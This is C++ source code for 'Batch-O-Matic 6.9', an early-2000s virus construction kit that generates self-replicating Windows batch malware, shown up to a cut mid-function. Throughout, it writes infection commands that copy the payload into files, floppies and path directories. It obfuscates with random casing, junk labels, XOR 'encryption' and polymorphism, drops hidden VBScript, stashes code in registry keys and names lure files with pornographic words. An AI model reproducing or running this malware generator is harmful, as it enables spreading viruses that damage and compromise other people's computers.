/////////////////////////////////////////////////////////////////////////////
// Batch-O-Matic 6.9 Source Code - � 2002-2003 SAD1c - All Rights Reserved //
/////////////////////////////////////////////////////////////////////////////

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
#include "Unit15.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
AnsiString rs1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_";
//---------------------------------------------------------------------------
AnsiString __fastcall TForm1::GetDFF(AnsiString f)
{
    AnsiString dir;
    int p;
    bool done = false;
    for (int a=f.Length(); a>0; a--)
    {
        if (int(f[a])==92 && (!done))
        {
            p = a;
            done = true;
        }
    }
    for (int b=1; b<p; b++)
        dir = dir + AnsiString(f[b]);
    return dir;
}
//---------------------------------------------------------------------------
AnsiString __fastcall TForm1::NameRand(bool type)
{
    AnsiString ret;
    if (type)
    {
        AnsiString arr1[31] = {"bitch","play","whores","erotic","lovers","oriental","petite","fetish","babes","jokes","links","sites","sexy","hot","nude","pics","free","porn","lesbo","anal","oral","fuck","sex","boobs","asian","teen","hard","virgin","adult","xxx","girl"};
        Randomize();
        ret = arr1[random(31000)/1000];
    }
    else
    {
        AnsiString arr2[40] = {"host","wiz","init","run","reg","prog","watch","view","explore","drv","shell","desk","data","app","setup","update","patch","sys","win","cfg","debug","log","net","MS","dll","set","task","file","help","cmd","fix","32","srv","load","exe","user","edit","tray","adm","prn"};
        Randomize();
        ret = arr2[random(40000)/1000];
    }
    return ret;
}
//---------------------------------------------------------------------------
AnsiString __fastcall TForm1::CaseRand(AnsiString str)
{
    AnsiString crstr, tmp;
    int ran;
    for (int n = 1; n < str.Length()+1; n++)
    {
        tmp = str[n];
        Randomize();
        ran = random(20000);
        if (ran<2500 || (ran>5000 && ran<7500) || (ran>10000 && ran<12500) || (ran>15000 && ran<17500)) crstr = crstr + UpperCase(tmp);
        else crstr = crstr + LowerCase(tmp);
    }
    return crstr;
}
//---------------------------------------------------------------------------

AnsiString __fastcall TForm1::AdirRand(int num)
{
    AnsiString adstr;
    int ran;
    for (int n = 0; n < num; n++)
    {
        Randomize();
        ran = random(22);
        ran++;
        adstr = adstr + Label666->Caption[ran];
    }
    return adstr;
}
//---------------------------------------------------------------------------

AnsiString __fastcall TForm1::AsciiRand(int num)
{
    Randomize();
    int tnum = num;
    num = random(num)+2;
    if (num > tnum) num = tnum;
    AnsiString ascstr;
    int ran;
    for (int n = 0; n < num; n++)
    {
        Randomize();
        ran = random(232);
        if (ran==0) ran = 230;
        ran++;
        ascstr = ascstr + Button666->Caption[ran];
    }
    return ascstr;
}
//---------------------------------------------------------------------------
AnsiString __fastcall TForm1::StrRand(int num, int an)
{
    int tnum = num;
    Randomize();
    num = random(num)+2;
    if (num < 2) num = 2;
    if (num > tnum) num = tnum;
    AnsiString str;
    int ran, par;
    if (an == 0)
    {
        par = 52;
        Randomize();
        ran = random(par);
        ran++;
        str = str + rs1[ran];
        par = 63;
        for (int n = 0; n < num-1; n++)
        {
            Randomize();
            ran = random(par);
            ran++;
            str = str + rs1[ran];
        }
    }
    if (an == 1)
    {
        par = 63;
        for (int n = 0; n < num; n++)
        {
            Randomize();
            ran = random(par);
            ran++;
            str = str + rs1[ran];
        }
    }
    if (an == 2)
    {
        par = 52;
        for (int n = 0; n < num; n++)
        {
            Randomize();
            ran = random(par);
            ran++;
            str = str + rs1[ran];
        }
    }
    if (an == 3)
    {
        for (int n = 0; n < num; n++)
        {
            Randomize();
            ran = random(10000)/1000;
            str = str + ran;
        }
    }
    return str;
}
//---------------------------------------------------------------------------

AnsiString __fastcall TForm1::Infstr(AnsiString sa, AnsiString sb, int in)
{
    AnsiString inf;
    if (in == 1) inf = "copy " + sa + " " + sb + " /y";
    if (in == 2) inf = "copy " + sb + "+" + sa + " " + sb + " /y /b";
    if (in == 3) inf = "copy " + sa + "+" + sb + " %2 /y /b";
    return inf;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::wstf(AnsiString str)
{
    if (Form15->CheckBox90->Checked == true && str!=AnsiString(":" + labelstr))
    {
        fil.put(char(58));
        for (int a=1; a<labelstr.Length()+1; a++)
            fil.put(labelstr[a]);
        fil.put(char(13));
        fil.put(char(10));
        for (int b=1; b<str.Length()+1; b++)
            fil.put(str[b]);
        fil.put(char(13));
        fil.put(char(10));
        labelstr = noso + StrRand(10,1);
        fil.put('g');
        fil.put('o');
        fil.put('t');
        fil.put('o');
        fil.put(char(32));
        for (int c=1; c<labelstr.Length()+1; c++)
            fil.put(labelstr[c]);
        fil.put(char(13));
        fil.put(char(10));
    }
    else
    {
        for (int x=1; x<str.Length()+1; x++)
            fil.put(str[x]);
        fil.put(char(13));
        fil.put(char(10));
    }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::wstfnr(AnsiString str)
{
    for (int a=1; a<str.Length()+1; a++)
        fil.put(str[a]);
}
//---------------------------------------------------------------------------
AnsiString __fastcall TForm1::EncryptData(AnsiString all)
{
    AnsiString edata, te = all;
    if (Form15->CheckBox60->Checked)
    {
        for (int a=te.Length(); a>0; a--)
            edata = edata + AnsiString(te[a]);
        te = edata;
        edata = "";
    }
    int atc = 1;
    for (int a=1; a<te.Length()+1; a++)
    {
        int ca = int(te[a]);
        ca = ca^int(epwd[atc]);
        edata = edata + AnsiString(char(ca));
        if (atc == epwd.Length()) atc = 1;
        else atc++;
    }
    return edata;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button2Click(TObject *Sender)
{
    if (SaveDialog1->Execute()==True)
    {
        if (SaveDialog1->FileName!="")
        {
    SaveDialog1->InitialDir = GetDFF(SaveDialog1->FileName);
    CheckBox1->Visible = false;
    Label25->Caption = "Creation in progress. Please wait.";
    Label25->Visible = true;
    Application->ProcessMessages();
    AnsiString exts = AsciiRand(4);
    int infn;
    if (Form15->RadioButton1->Checked) infn = 1;
    if (Form15->RadioButton2->Checked) infn = 2;
    if (Form15->RadioButton5->Checked) infn = 3;
    int msgp = 0; // msgbox mode
    if (Form15->ComboBox13->Text=="Critical") msgp = 16;
    if (Form15->ComboBox13->Text=="Question") msgp = 32;
    if (Form15->ComboBox13->Text=="Exclamation") msgp = 48;
    if (Form15->ComboBox13->Text=="Information") msgp = 64;
    if (Form15->CheckBox71->Checked) msgp = msgp + 4096;
    AnsiString subs = StrRand(4, 2), tfre = StrRand(3, 1);
    AnsiString subd = NameRand(0)+subs+NameRand(0), subf = subs+NameRand(0);
    AnsiString dosd = StrRand(8, 1), ovft = StrRand(8, 1);
    AnsiString wisn = StrRand(8, 1), wis1 = StrRand(8, 1), wis2 = StrRand(8, 1), wis3 = StrRand(8, 1);
    AnsiString sisn = StrRand(8, 1), sis1 = StrRand(8, 1), sis2 = StrRand(8, 1);
    AnsiString tmpn = Form15->Edit10->Text;
    AnsiString sfr3 = NameRand(0)+NameRand(0), sfr4 = NameRand(0)+NameRand(0)+NameRand(0);
    AnsiString rssv = StrRand(8, 1);
    noso = AsciiRand(6);
    AnsiString fffr = AsciiRand(8), ffos = "%" + noso + "%";
    AnsiString istd = Form15->ComboBox12->Text, istv = Form15->Edit11->Text, istj = Form15->Edit12->Text;
    AnsiString dtr1 = AsciiRand(6), dtr2 = AsciiRand(6), vbih = AsciiRand(6);
    AnsiString mnra = StrRand(11, 1);
    AnsiString sdrv = StrRand(10, 0), sfld = StrRand(10, 0), drvs = StrRand(10, 0);
    AnsiString fldf = StrRand(10, 0), flds = StrRand(10, 0), fldt = StrRand(10, 0);
    AnsiString aiif = StrRand(10, 0), aiia = StrRand(10, 0), diia = StrRand(10, 0), dia2=StrRand(10, 0);
    AnsiString itmp = StrRand(8, 1), dihn = StrRand(8, 1);
    AnsiString rssa = StrRand(10, 0), rssk = StrRand(10, 0), rssm = StrRand(10, 0);
    AnsiString fvw1 = StrRand(10, 0), fvw2 = StrRand(10, 0), fvw6 = StrRand(10, 0), fvw5 = StrRand(10, 0);
    AnsiString paiv = StrRand(8, 1), lavv = noso + StrRand(8, 1), lenv = noso + StrRand(8, 1);
    AnsiString dfrv = StrRand(1, 0), jsfs = StrRand(10, 0), jsws = StrRand(10, 0), paij = StrRand(8, 1);
    AnsiString lavj = noso + StrRand(8, 1), lenj = noso + StrRand(8, 1), favc = AsciiRand(6);
    AnsiString dihf = StrRand(10, 0), dihx = StrRand(10, 0);
    AnsiString sdfv = StrRand(10, 0), emnk = StrRand(10, 0);
    AnsiString sdv1 = StrRand(10, 0), sdv2 = StrRand(10, 0), sdv3 = StrRand(10, 0);
    AnsiString emnf = StrRand(10, 0), pfdc = StrRand(10, 0);
    AnsiString emnn = StrRand(10, 0);        
    AnsiString emn1 = StrRand(10, 0);
    AnsiString emnt = StrRand(10, 0);
    AnsiString emnd = StrRand(10, 0);
    AnsiString vbir = StrRand(10, 0);
    AnsiString vbic = StrRand(10, 0);
    AnsiString vbim = StrRand(10, 0);
    AnsiString vbik = StrRand(10, 0);
    AnsiString lfdc = StrRand(10, 0);
    AnsiString msv2 = StrRand(10, 0);
    AnsiString msv3 = StrRand(10, 0);
    AnsiString msfv = StrRand(10, 0);
    AnsiString msoa = StrRand(10, 0);
    AnsiString msma = StrRand(10, 0);
    AnsiString msal = StrRand(10, 0);
    AnsiString msae = StrRand(10, 0);
    AnsiString msci = StrRand(10, 0);
    AnsiString ispv = StrRand(10, 0);
    AnsiString cspf = StrRand(10, 0);
    AnsiString cfpf = StrRand(10, 0);
    AnsiString cmpf = StrRand(10, 0);
    AnsiString vbif = StrRand(10, 0);
    AnsiString vbib = StrRand(10, 0);
    AnsiString vbv3 = StrRand(10, 0);
    AnsiString plk3 = StrRand(10, 0);
    AnsiString sfrx = StrRand(10, 0);
    AnsiString sfrk = StrRand(10, 0);
    AnsiString tfpx = StrRand(6, 0);
    AnsiString cspv = StrRand(10, 0);
    AnsiString cmpv = StrRand(10, 0);
    AnsiString cfpv = StrRand(10, 0);
    AnsiString vbv1 = StrRand(10, 0);
    AnsiString vbv2 = StrRand(10, 0);
    AnsiString plrn = StrRand(10, 0);
    AnsiString plk1 = StrRand(10, 0);
    AnsiString plk2 = StrRand(10, 0);
    AnsiString subc = StrRand(1, 0);
    AnsiString sfso = StrRand(10, 0);
    AnsiString wshl = StrRand(10, 0);
    AnsiString actw = StrRand(10, 0);
    AnsiString rg1w = StrRand(10, 0);
    AnsiString rg2w = StrRand(10, 0);
    AnsiString sfr1 = StrRand(10, 0);
    AnsiString sfr2 = StrRand(10, 0);
    AnsiString rsss = AsciiRand(6);
    AnsiString pisf = AsciiRand(6);
    AnsiString mss2 = AsciiRand(6);
    AnsiString ebds = AsciiRand(6);
    AnsiString tmps = StrRand(10, 0);
    AnsiString sdtf = StrRand(8, 1);
    AnsiString sdt2 = StrRand(8, 1);
    AnsiString sdvw = StrRand(8, 1);
    AnsiString sdk1 = StrRand(8, 1);
    AnsiString sdk2 = StrRand(8, 1);
    AnsiString sdk3 = StrRand(8, 1), lenh = noso + StrRand(8, 1);
    AnsiString htmv = StrRand(10, 0), htmt = StrRand(8, 1), paih = StrRand(8, 1), lavh = noso + StrRand(8, 1);
    AnsiString lasd = noso + StrRand(8, 1);
    AnsiString lsd2 = noso + StrRand(8, 1);
    AnsiString prsd = StrRand(8, 1);
    AnsiString emnw = StrRand(8, 1);
    AnsiString emnv = StrRand(8, 1);
    AnsiString pfds = StrRand(8, 1);
    AnsiString lfds = StrRand(8, 1);
    AnsiString tfpe = StrRand(10, 1);
    AnsiString lafb = noso + StrRand(8, 1);
    AnsiString la3e = noso + StrRand(8, 1);
    AnsiString parf = StrRand(8, 1);
    AnsiString bfpn = StrRand(8, 1);        
    AnsiString la2e = noso + StrRand(8, 1);
    AnsiString parp = StrRand(8, 1);
    AnsiString labp = noso + StrRand(8, 1);
    AnsiString labf = noso + StrRand(8, 1);
    AnsiString labe = noso + StrRand(8, 1);
    AnsiString pari = StrRand(8, 1);
    AnsiString labv = noso + StrRand(8, 1);
    AnsiString tmpv = StrRand(8, 1);
    AnsiString tmpw = StrRand(8, 1);
    AnsiString acts = StrRand(8, 1);
    AnsiString actx = StrRand(8, 1), kkns = AsciiRand(6);
    AnsiString actv = StrRand(8, 1), vint = AsciiRand(8), pyfv = StrRand(8, 1);
    AnsiString behv = StrRand(8, 1), beht = StrRand(8, 1), behx = StrRand(8, 1), behk = StrRand(8, 1);
    AnsiString beh1 = StrRand(10, 0), beh2 = StrRand(10, 0), beh3 = StrRand(10, 0);
    AnsiString behr = StrRand(8, 1), behl = noso + StrRand(8, 1), flss = StrRand(10, 0);
    AnsiString autl = noso + StrRand(8, 1), autn = StrRand(8, 1), wstl = noso + StrRand(8, 1), wstn = StrRand(8, 1);
    AnsiString rg1v = StrRand(8, 1), rg2v = StrRand(8, 1), pymv = StrRand(8, 1);
    AnsiString rg1k = Form15->Edit22->Text, rg2k = Form15->Edit23->Text, fvai = StrRand(10, 0), fvps = StrRand(8, 1);
    AnsiString sfls = StrRand(10, 0), bfp5 = StrRand(10, 0), pyrv = StrRand(8, 1), pyrn = StrRand(10, 0);
    AnsiString bfp1 = StrRand(10, 0), bfp2 = StrRand(10, 0), bfp3 = StrRand(10, 0), bfp4 = StrRand(10, 0);
    AnsiString faf1 = StrRand(10, 0), faf2 = StrRand(10, 0), faf3 = StrRand(10, 0);
    AnsiString fafB = StrRand(10, 0), fafX = StrRand(10, 0), fafY = StrRand(10, 0);
    AnsiString emni = StrRand(8, 1), avd1 = StrRand(10, 0), mskn = StrRand(10, 0);
    AnsiString vtmr = StrRand(8, 1), dosr = StrRand(8, 1), aur1 = StrRand(10, 0);
    AnsiString aur2 = StrRand(10, 0), aur3 = StrRand(10, 0), aurk = StrRand(8, 1), aurx = StrRand(8, 1);
    AnsiString p2pd = StrRand(10, 0), p2pi = StrRand(10, 0), p2pp = StrRand(10, 0), p2pk = StrRand(10, 0);
    AnsiString mird = StrRand(10, 0), mirs = StrRand(10, 0), pird = StrRand(10, 0), pirs = StrRand(10, 0);
    AnsiString misn = Form15->Edit18->Text + Form15->ComboBox17->Text;
    AnsiString visn = Form15->Edit20->Text + Form15->ComboBox19->Text;
    AnsiString pisn = Form15->Edit19->Text + Form15->ComboBox18->Text;
    AnsiString cib1 = StrRand(10, 0);
    AnsiString cfpy = StrRand(10, 0), cfpa = StrRand(10, 0), ftc1 = StrRand(10, 0);
    AnsiString ftck = StrRand(10, 0), ftcx = StrRand(10, 0), ftcd, emns = StrRand(10, 0);
    AnsiString msha = StrRand(10, 0), mshg = StrRand(10, 0), msrk = StrRand(10, 0), mskr = StrRand(10, 0);
    AnsiString mssr = StrRand(10, 0), mssl = StrRand(10, 0), msbr = StrRand(10, 0), msbl = StrRand(10, 0);
    AnsiString msar = StrRand(10, 0), msat = StrRand(10, 0), mnfv = StrRand(10, 0), safl = StrRand(10, 0);
    AnsiString safa = StrRand(10, 0), safb = StrRand(10, 0), saff = StrRand(10, 0), saf2 = StrRand(10, 0);
    AnsiString saft = StrRand(10, 0), saf1 = StrRand(10, 0), safc = StrRand(10, 0), safv = StrRand(10, 0);
    AnsiString safx = StrRand(10, 0), safk = StrRand(10, 0), msfa = StrRand(10, 0), mssa = StrRand(10, 0);
    AnsiString tfak = StrRand(8, 1), tmut = StrRand(8, 1), fakn = StrRand(10, 0), faka = StrRand(10, 0);
    AnsiString fakc = StrRand(10, 0), fakt = StrRand(4, 0), faks = StrRand(10, 0), fakf = StrRand(10, 0);
    AnsiString fakr = StrRand(10, 0), fakl = StrRand(10, 0), muta = StrRand(10, 0), mutc = StrRand(10, 0);
    AnsiString mutt = StrRand(4, 0), muts = StrRand(10, 0), mutf = StrRand(10, 0), mutr = StrRand(10, 0);
    AnsiString mutl = StrRand(10, 0), mutb = StrRand(4, 0), rvtfk = "%"+AsciiRand(6)+"%", adsd = StrRand(10, 0);
    AnsiString polar = AsciiRand(10), polt = StrRand(8, 1), polk = StrRand(8, 1), pol5 = StrRand(10, 0);
    AnsiString pol1 = StrRand(10, 0), pol2 = StrRand(10, 0), pol3 = StrRand(10, 0), pol4 = StrRand(10, 0);
    AnsiString polr = StrRand(10, 0), polv = StrRand(10, 0), polp = StrRand(10, 0), pols = StrRand(10, 0);
    AnsiString pola = StrRand(10, 0), poll = StrRand(10, 0), polb = StrRand(10, 0), polf = StrRand(10, 0);
    AnsiString polu = StrRand(10, 0), pold = StrRand(10, 0), polub = StrRand(10, 0), poldb = StrRand(10, 0);
    AnsiString srstfk = AsciiRand(11), mssar = StrRand(8, 0), mssal = StrRand(8, 0), excr = StrRand(8, 1);
    AnsiString rryf = StrRand(10, 0), rryc = StrRand(10, 0), rryo = StrRand(10, 0), rry1 = StrRand(10, 0);
    AnsiString rry2 = StrRand(10, 0), rry3 = StrRand(10, 0), exck = StrRand(10, 1), excv = StrRand(10, 1);
    AnsiString kmrs = StrRand(10, 0), kmrd = StrRand(10, 0), kmrf = StrRand(10, 0), kmrv = StrRand(10, 0);
    AnsiString eeuv = StrRand(8, 1), eeth = StrRand(8, 0), eeeu = StrRand(8, 0);
    AnsiString eefs = StrRand(8, 0), eebc = StrRand(8, 1), eedf = StrRand(8, 0);
    AnsiString eevf = StrRand(8, 0), eedd = StrRand(8, 0), eeft = StrRand(8, 0);
    AnsiString eepw = StrRand(8, 0), eed1 = StrRand(8, 0), eed2 = StrRand(8, 0);
    AnsiString eect = StrRand(8, 0), eecc = StrRand(8, 0), eepc = StrRand(8, 0);
    AnsiString eexx = StrRand(8, 1), eeyy = StrRand(8, 1), wmtm = StrRand(8, 1);
    AnsiString wmv1 = StrRand(8, 0), wmcv = StrRand(8, 0), wmtc = StrRand(8, 0);
    AnsiString wmmf = StrRand(8, 0), wmvc = StrRand(8, 0), wmbf = StrRand(8, 1);
    AnsiString emv1 = StrRand(8, 0), emcv = StrRand(8, 0), emtc = StrRand(8, 0), emtm = StrRand(8, 1);
    AnsiString wmwa = StrRand(8, 0), wmnt = StrRand(8, 0), wmid = StrRand(8, 1);
    AnsiString emea = StrRand(8, 0), emes = StrRand(8, 0), emis = StrRand(8, 1);
    Randomize();               
    epwd = StrRand((random(18)+6), 1);
    bool kk2;
    if (istd == "%windir%") istd = CaseRand(istd);
    if (istd == "System" || istd == "System32") istd = "%"+CaseRand("windir")+"%\\" + CaseRand(istd);
    if (istd == "Root") istd = "c:";
    if (istd == "Recycle Bin") istd = "c:\\"+CaseRand("recycled");
    if (Form15->ComboBox12->Enabled == false) istd = "%tmp%";
    AnsiString plam;
    if(Form15->ComboBox1->Text == "Jan") plam = "1";
    if(Form15->ComboBox1->Text == "Feb") plam = "2";
    if(Form15->ComboBox1->Text == "Mar") plam = "3";
    if(Form15->ComboBox1->Text == "Apr") plam = "4";
    if(Form15->ComboBox1->Text == "May") plam = "5";
    if(Form15->ComboBox1->Text == "Jun") plam = "6";
    if(Form15->ComboBox1->Text == "Jul") plam = "7";
    if(Form15->ComboBox1->Text == "Ago") plam = "8";
    if(Form15->ComboBox1->Text == "Sep") plam = "9";
    if(Form15->ComboBox1->Text == "Oct") plam = "10";
    if(Form15->ComboBox1->Text == "Nov") plam = "11";
    if(Form15->ComboBox1->Text == "Dec") plam = "12";
    AnsiString sdam;
    if(Form15->ComboBox8->Text == "Jan") sdam = "1";
    if(Form15->ComboBox8->Text == "Feb") sdam = "2";
    if(Form15->ComboBox8->Text == "Mar") sdam = "3";
    if(Form15->ComboBox8->Text == "Apr") sdam = "4";
    if(Form15->ComboBox8->Text == "May") sdam = "5";
    if(Form15->ComboBox8->Text == "Jun") sdam = "6";
    if(Form15->ComboBox8->Text == "Jul") sdam = "7";
    if(Form15->ComboBox8->Text == "Ago") sdam = "8";
    if(Form15->ComboBox8->Text == "Sep") sdam = "9";
    if(Form15->ComboBox8->Text == "Oct") sdam = "10";
    if(Form15->ComboBox8->Text == "Nov") sdam = "11";
    if(Form15->ComboBox8->Text == "Dec") sdam = "12";
    AnsiString infd;
    if(Form15->CheckBox27->Checked == true) infd = " *.%" + exts + "%";
    if(Form15->CheckBox28->Checked == true) infd = infd + " A:\\*.%" + exts + "%";
    if(Form15->CheckBox29->Checked == true) infd = infd + " ..\\*.%" + exts + "%";
    if(Form15->CheckBox21->Checked == true) infd = infd + " \\*.%" + exts + "%";
    if(Form15->CheckBox23->Checked == true) infd = infd + " %path%\\*.%" + exts + "%";
    if(Form15->CheckBox24->Checked == true) infd = infd + " %" + ebds + "%\\*.%" + exts + "%";
    if(Form15->CheckBox33->Checked == true)
    {
        dosd = AdirRand(8);
    }
    fil.open(SaveDialog1->FileName.c_str(),ios::binary);
    wstfnr("%"+fffr+"%");
    fil.put(char(13));
    fil.put(char(10));
    if (Form15->CheckBox37->Checked && Form15->RadioButton17->Checked && Form15->CheckBox49->Checked == false)
    {
        wstfnr("@REM " + Form15->Label29->Caption + " - By " + Form15->Edit2->Text);
        fil.put(char(13));
        fil.put(char(10));
        wstfnr("@REM Created with " + Form15->Label1->Caption + " - By SAD1c");
        fil.put(char(13));
        fil.put(char(10));
    }
    if (Form15->CheckBox30->Checked)
    {
        Randomize();
        int num = random(20)+11;
        AnsiString fakel;
        for (int mn=0; mn<num; mn++)
        {
            fakel = ":" + AsciiRand(111);
            wstfnr(fakel);
            fil.put(char(13));
            fil.put(char(10));
        }
    }
    labelstr = noso + StrRand(10,1);
    if (Form15->CheckBox90->Checked)
    {
        wstfnr("@goto " + labelstr);
        fil.put(char(13));
        fil.put(char(10));
    }
    wstf("@"+CaseRand("echo off") + ffos);
    wstf(CaseRand("if not exist %windir%\\system32\\shutdown.exe")+" "+CaseRand("ctty nul")+ ffos);
    if (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)
    {
        if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox11->Checked == true || Form15->CheckBox38->Checked == true)) wstf("if " + pari + "==%1 goto " + labv);
        if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox12->Checked == true || Form15->CheckBox25->Checked == true)) wstf("if " + paiv + "==%1 goto " + lavv);
        if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox19->Checked == true || Form15->CheckBox26->Checked == true)) wstf("if " + paij + "==%1 goto " + lavj);
        if ((Form15->CheckBox44->Checked == false) && (Form15->CheckBox36->Checked == true || Form15->CheckBox51->Checked == true || Form15->CheckBox52->Checked == true || Form15->CheckBox58->Checked == true)) wstf("if " + paih + "==%1 goto " + lavh);
    }
    if (Form15->CheckBox42->Checked == true || Form15->CheckBox45->Checked == true)
        wstf("if " + parp + "==%1 goto " + labp);
    if (Form15->CheckBox41->Checked == true)
        wstf("if " + parf + "==%1 goto " + lafb);
    if (Form15->CheckBox53->Checked == true)
        wstf("if " + prsd + "==%1 goto " + lasd);
    wstf(ffos + CaseRand("rem ") + srstfk + CaseRand("|set")+" " + vbih + "=Script");
    wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" if " + tmps + ".regread(\"HKCU\\Software\\" + plrn + "\\" + exck + "\")=\"\" then'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    wstf(CaseRand("echo")+" dim " + tmps + ">>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + tmps + "="+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\")>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    if (Form15->RadioButton4->Checked)
    { // registry spawning (read the code from the registry)
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + rryf + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" dim " + rryc + "'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" "+ rryc + "=" + tmps + ".regread(\"HKCU\\Software\\" + plrn + "\\\")'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + rryo + "=" + rryf + ".createtextfile(\""+istd+"\\" + tmpn + ".bat\",1)'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" " + rryo + ".write "+ rryc + "'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
        wstf(CaseRand("echo")+" " + rryo + ".close'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    }
    wstf(CaseRand("echo")+" " + tmps + ".run \""+istd+"\\" + tmpn + ".bat "+vtmr+"\",0>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" " + tmps + ".regwrite \"HKCU\\Software\\" + plrn + "\\" + exck + "\",\"" + excv + "\"'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    if (Form15->CheckBox92->Checked) wstf(CaseRand("echo")+" end if'run>>%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+"" + ffos);
    wstf("if " + vint + "%"+CaseRand("windir")+"%==" + vint + " "+CaseRand("set")+" windir=%systemroot%" + ffos);
    if (Form15->RadioButton3->Checked) wstf("if exist "+istd+"\\" + tmpn + ".bat attrib -r -s -h "+istd+"\\" + tmpn + ".bat" + ffos);
    wstf(CaseRand("echo")+" %%" + fffr + "%%>"+istd+"\\" + tmpn + ".bat");
    if (Form15->CheckBox30->Checked)
    {
        wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim "+fakn+","+faka+","+fakc+","+fakt+">>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + faks + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + fakf + "=" + faks + ".opentextfile(\""+istd+"\\" + tmpn + ".bat\",8)>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for "+fakn+"=0 to int(rnd*20)+11>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+faka+"="+faka+"&\":\"&"+fakr+"(int(rnd*111))&vbcrlf>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" function "+fakr+"("+fakl+")>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" for "+fakc+"=1 to "+fakl+">>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+fakt+"=int(rnd*256)>>%"+CaseRand("tmp")+"%\\" + tmut + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+fakr+"="+fakr+"&chr("+fakt+")>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end function>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + fakf + ".write "+faka+">>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + fakf + ".close>>%"+CaseRand("tmp")+"%\\" + tfak + ".vbs" + ffos);
        wstf("cscript %"+CaseRand("tmp")+"%\\" + tfak + ".vbs>nul" + ffos);
    }
    if (Form15->CheckBox90->Checked)
    {  // polymorphism
        AnsiString polX = StrRand(8, 0), polY = StrRand(8, 1), polH = StrRand(8, 0);
        wstf("find \"" + noso + "\"<%0>>%"+CaseRand("tmp")+"%\\" + polt + "."+tfre + ffos);
        wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + polH + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"w%" + vbih + "%.shell\")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if " + polH + ".regread(\"HKCU\\Software\\" + plrn + "\\" + polX + "\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim "+polr+","+polv+","+pol5+","+pol4+","+polp+","+pol3+","+pols+","+pola+","+poll+","+pol1+","+pol2+","+polb+">>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + pols + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + polk + ".vbs" + ffos);
